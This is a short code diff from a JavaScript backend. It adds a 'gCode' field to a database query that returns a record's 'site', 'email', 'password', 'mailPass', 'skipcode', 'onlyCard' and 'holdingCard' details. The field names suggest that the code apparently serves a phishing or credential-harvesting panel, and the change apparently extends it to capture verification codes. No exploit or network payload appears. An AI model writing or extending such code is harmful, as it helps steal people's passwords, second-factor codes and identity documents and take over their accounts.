@@ -312,7 +312,7 @@ export const info_get = async (req, res) => {
 
         }
 
-        const poster = await Poster.findOne({ _id: id }).select('details').populate('details', 'site email password skipcode mail mailPass onlyCard holdingCard').sort({ createdAt: -1 })
+        const poster = await Poster.findOne({ _id: id }).select('details').populate('details', 'site email password gCode skipcode mail mailPass onlyCard holdingCard').sort({ createdAt: -1 })
         return res.status(200).json({ poster: poster })
     } catch (e) {
         res.status(400).json({ e: "error" })
